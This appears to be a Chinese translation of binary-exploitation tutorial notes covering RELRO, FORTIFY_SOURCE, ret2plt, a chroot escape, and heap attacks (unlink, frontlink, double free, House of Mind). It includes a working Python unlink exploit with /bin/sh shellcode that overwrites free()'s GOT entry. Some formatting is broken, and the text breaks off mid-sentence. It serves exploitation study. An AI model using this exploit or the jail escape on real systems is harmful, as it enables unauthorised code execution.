gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
对于**没有 relro**的二进制文件，我们可以看到 `fgets` 的 `got` 条目地址是 `0x404018`。查看内存映射，我们看到它位于 `0x404000` 和 `0x405000` 之间，具有**权限 `rw`**，意味着我们可以对其进行读写。对于**启用了 relro**的二进制文件，我们看到运行该二进制文件时 `got` 表的地址（启用了 pie，所以这个地址会变化）是 `0x555555557fd0`。在该二进制文件的内存映射中，它位于 `0x0000555555557000` 和 `0x0000555555558000` 之间，具有内存**权限 `r`**，意味着我们只能从中读取。

那么**绕过**方法是什么呢？我通常使用的绕过方法是不对 relro 导致只读的内存区域进行写操作，而是**找到不同的方法来执行代码**。

请注意，为了实现这一点，二进制文件需要在执行之前知道函数的地址：

* 延迟绑定：函数的地址在第一次调用函数时被搜索。因此，GOT 在执行期间需要具有写权限。
* 立即绑定：函数的地址在执行开始时被解析，然后对像 .got、.dtors、.ctors、.dynamic、.jcr 等敏感部分给予只读权限。`` `**``-z relro`**`和`**`-z now\`\*\*

要检查程序是否使用立即绑定，你可以执行：
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
```markdown
当二进制文件加载到内存中，第一次调用函数时，会跳转到PLT（Procedure Linkage Table）。从这里，会进行跳转（jmp）到GOT，并发现该条目尚未解析（包含PLT后续地址）。因此，它会调用运行时链接器或rtfd来解析地址，并将其保存在GOT中。

调用函数时，会调用PLT，PLT中包含GOT的地址，GOT中存储了函数的地址，因此会将流程重定向到那里，从而调用函数。但是，如果是第一次调用函数，GOT中的内容是PLT的下一条指令，因此流程会遵循PLT（rtfd）的代码，并找出函数的地址，将其保存在GOT中并调用它。

加载二进制文件到内存时，编译器会指示在何处放置在程序运行时必须加载的数据。

Lazy binding —> 函数地址在第一次调用该函数时查找，因此GOT具有写入权限，以便在查找时保存在那里，无需再次查找。

Bind now —> 在加载程序时查找函数的地址，并将.got、.dtors、.ctors、.dynamic、.jcr等部分的权限更改为只读。**-z relro** 和 **-z now**

尽管如此，通常程序没有使用这些选项编译，因此这些攻击仍然是可能的。

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** —> 用于检查是否使用了BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 或 =2**

尝试识别不安全地从一个位置复制到另一个位置的函数，并将该函数替换为安全函数。

例如:\
char buf[16];\
strcpy(but, source);

它将识别为不安全的，然后将strcpy()替换为__strcpy_chk()，使用缓冲区大小作为最大复制长度。

**=1** 和 **=2** 之间的区别是：

第二种情况不允许**%n**来自具有写入权限的部分。此外，直接访问参数的参数只能在使用前面的参数后使用，即只能在使用了**%2$d** 和 **%1$d** 后使用 **%3$d**。

为了显示错误消息，使用argv[0]，因此如果在其中放置另一个位置的地址（如全局变量），错误消息将显示该变量的内容。第191页

**Libsafe替换**

通过以下方式激活：LD_PRELOAD=/lib/libsafe.so.2\
或\
“/lib/libsave.so.2” > /etc/ld.so.preload

它通过安全的函数拦截对某些不安全函数的调用。这不是标准化的。（仅适用于x86，不适用于-fomit-frame-pointer的编译，不适用于静态编译，不是所有易受攻击的函数都变得安全，LD_PRELOAD不适用于具有suid的二进制文件）。

**ASCII Armored Address Space**

通过将共享库加载到0x00000000到0x00ffffff的地址空间中，使得总是有一个0x00字节。然而，这实际上并没有阻止几乎任何攻击，尤其是在little endian中。

**ret2plt**

通过ROP调用strcpy@plt（来自plt的函数），并将其指向GOT的条目，并将要调用的函数（system()）的第一个字节复制到其中。接下来，做同样的事情，指向GOT+1并复制system()的第二个字节...最终调用保存在GOT中的地址，该地址将是system()

**伪造EBP**

对于使用EBP作为指向参数的寄存器的函数，修改EIP并指向system()时，也必须修改EBP，以便它指向内存中有两个任意字节后跟&“/bin/sh”地址的区域。

**使用chroot()的监狱**

debootstrap -arch=i386 hardy /home/user —> 在特定子目录下安装基本系统

管理员可以通过以下方式退出这些监狱：mkdir foo; chroot foo; cd ..

**代码插桩**

Valgrind —> 寻找错误\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 堆溢出：基础利用技巧**

**已分配块**

prev_size |\
size | —头部\
*mem | 数据

**空闲块**

prev_size |\
size |\
*fd | 向前块指针\
*bk | 向后块指针 —头部\
*mem | 数据

空闲块在双向链表（bin）中，且不能有两个相邻的空闲块（它们会合并）

在“size”中有位标志，用于指示：前一个块是否正在使用，该块是否通过mmap()分配，以及该块是否属于主arena。

释放块时，如果相邻的块是空闲的，则它们会通过unlink()宏合并，并将新的更大的块传递给frontlink()，以便将其插入适当的bin中。

unlink(){\
BK = P->bk; —> 新块的BK是之前已经空闲的块的BK\
FD = P->fd; —> 新块的FD是之前已经空闲的块的FD\
FD->bk = BK; —> 下一个块的BK指向新块\
BK->fd = FD; —> 前一个块的FD指向新块\
}

因此，如果我们能够将P->bk修改为shellcode的地址，将P->fd修改为GOT或DTORS条目地址减去12，则可以实现：

BK = P->bk = &shellcode\
FD = P->fd = &__dtor_end__ - 12\
FD->bk = BK -> *((&__dtor_end__ - 12) + 12) = &shellcode

这样，在程序退出时就会执行shellcode。

此外，unlink()的第四条语句会写入一些内容，shellcode必须为此做好准备：

BK->fd = FD -> *(&shellcode + 8) = (&__dtor_end__ - 12) —> 这会导致从shellcode的第8个字节开始写入4个字节，因此shellcode的第一条指令必须是一个跳转指令，以跳过这部分并进入一系列nops，这些nops将导致执行shellcode的其余部分。

因此，exploit创建如下：

在buffer1中放入shellcode，以一个跳转指令开始，使其落入nops或shellcode的其余部分。

在shellcode之后填充，直到到达下一个块的prev_size和size字段。在这些位置放入0xfffffff0（以覆盖prev_size，使其具有表示空闲的位）和“-4”（0xfffffffc）作为size（这样当检查第三个块时，实际上会去到修改后的prev_size，它会告诉它第二个块是空闲的）-> 因此，当free()检查时，它会去到第三个块的size，但实际上会去到第二个块的size - 4，并认为第二个块是空闲的。然后它会调用**unlink()**。

调用unlink()时，它会使用第二个块的前几个数据作为P->fd，因此在那里放入想要覆盖的地址减去12（因为在FD->bk中会给FD中保存的地址加上12）。在这个地址中，它会插入第二个块中找到的第二个地址，我们希望这是shellcode的地址（假的P->bk）。

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes填充**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev_size = pack("\<I”, 0xfffffff0) #重要的是前一个块空闲的位为1**

**fake_size = pack("\<I”, 0xfffffffc) #-4，以便它认为第三个块的“size”在4字节后面（指向prev_size），因为它会在那里检查第二个块是否空闲**

**addr_sc = pack("\<I", 0x0804a008 + 8) #在payload开始时，我们会放入8字节的填充**

**got_free = pack("\<I", 0x08048300 - 12) #free()在plt中的地址-12（将是覆盖的地址，以便第二次调用free时启动shellcode）**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #如前所述，payload以8字节的填充开始**

**payload += prev_size + fake_size + got_free + addr_sc #修改第二个块，got_free指向我们将要保存addr_sc + 12的地址**

**os.system("./8.3.o " + payload)**

**unset() 逆序释放（wargame）**

我们控制了三个连续的块，并以与分配相反的顺序释放它们。

在这种情况下：

在块c中放入shellcode

我们使用块a来覆盖块b，使得size的PREV_INUSE位被禁用，以便它认为块a是空闲的。

此外，在块b的头部覆盖size，使其值为-4。

然后，程序会认为“a”是空闲的，并且在bin中，因此会调用unlink()来解除链接。然而，由于PREV_SIZE的值为-4，它会认为块“a”实际上是在b+4开始的。也就是说，它会对一个从b+4开始的块执行unlink()，因此在b+12处将是“fd”指针，在b+16处将是“bk”指针。

这样，如果我们在bk中放入shellcode的地址，在fd中放入“puts()”函数地址减去12的地址，我们就有了payload。

**Frontlink技术**

当释放某物且其相邻块不是空闲的时，不会调用unlink()，而是直接调用frontlink()。

当攻击的malloc从未被释放（free()）时，这个漏洞很有用。

需要：

一个可以通过数据输入函数溢出的缓冲区

一个与此缓冲区相邻的缓冲区，它将被释放，并且其头部的fd字段将由前一个缓冲区的溢出修改

一个将被释放的缓冲区，其大小大于512但小于前一个缓冲区

一个在步骤3之前声明的缓冲区，允许覆盖此缓冲区的prev_size

这样，通过对两个malloc进行无控制的溢出和一个受控制的溢出，但只释放一个，我们可以制作一个exploit。

**double free() 漏洞**

如果使用相同的指针调用free()两次，将有两个bin指向同一地址。

如果想要再次使用其中一个，可以正常分配。如果想要使用另一个，将分配相同的空间，因此我们将有“fd”和“bk”指针被前一个分配的数据篡改。

**After free()**

之前释放的指针再次被无控制地使用。

## **8 堆溢出：高级利用技巧**

Unlink()和FrontLink()技术在修改unlink()函数后被移除。

**The house of mind**

只需要一次free()调用就可以触发任意代码执行。需要寻找一个可以由前一个溢出并被释放的第二个块。

一次free()调用会触发public_fREe(mem)的调用，该函数执行以下操作：

mstate ar_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> 返回指向块开始地址的指针（mem-8）

…

ar_ptr = arena_for_chunk(p); —> chunk_non_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:&main_arena [1]

…

_int_free(ar_ptr, mem);

}

在[1]中，它检查size字段的NON_MAIN_ARENA位，可以修改以使检查返回true并执行heap_for_ptr()，该函数对“mem”执行and操作，将最不重要的2.5字节置为0（在我们的例子中，从0x0804a000变为0x08000000），并访问0x08000000->ar_ptr（就像它是一个struct heap_info）

这样，如果我们可以控制例如0x0804a000的块，并且将要释放一个块在**0x081002a0**，我们可以到达0x08100000的地址并写入任何我们想要的，例如**0x0804a000**。当释放第二个块时，它会发现heap_for_ptr(ptr)->ar_ptr返回我们在0x08100000写入的内容（因为之前应用了and操作，从0x081002a0得到的值是前4个字节的值，即ar_ptr）

这样，就会调用_int_free(ar_ptr, mem)，即**_int_free(0x0804a000, 0x081002a0)**\
**_int_free(mstate av, Void_t* mem){**\
…\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

正如我们之前看到的，我们可以控制av的值，因为它是我们在将要释放的块中写入的。

根据unsorted_chunks的定义，我们知道：\
bck = &av->bins[2]-8;\
fwd = bck->fd = *(av->bins[2]);\
fwd->bk = *(av->bins[2] + 12) = p;

因此，如果在av->bins[2]中写入__DTOR_END__-12的值，在最后一条指令中，将在__DTOR_END__中写入第二个块的地址。

也就是说，在第一个块的开头，我们需要多次写入__DTOR_END__-12的地址，因为av->bins[2]将从那里获取值。

在以最后5个零结束的第二个块的地址中，我们需要写入指向这个第一个块的地址，以便heap_for_ptr()认为ar_ptr位于第一个块的开头，并从那里获取av->bins[2]的值。

在第二个块中，由于第一个块的帮助，我们覆盖了prev_size，用一个跳转0x0c和一个激活-> NON_MAIN_ARENA的size。

接下来，在块2中放入许多nops，最后是shellcode

这样，将调用_int_free(TROZO1, TROZO2)，并按照指令在__DTOR_END__中写入TROZO2的prev_size地址，该地址将跳转到shellcode。

要应用这种技术，需要满足一些额外的要求，这些要求使得payload更加复
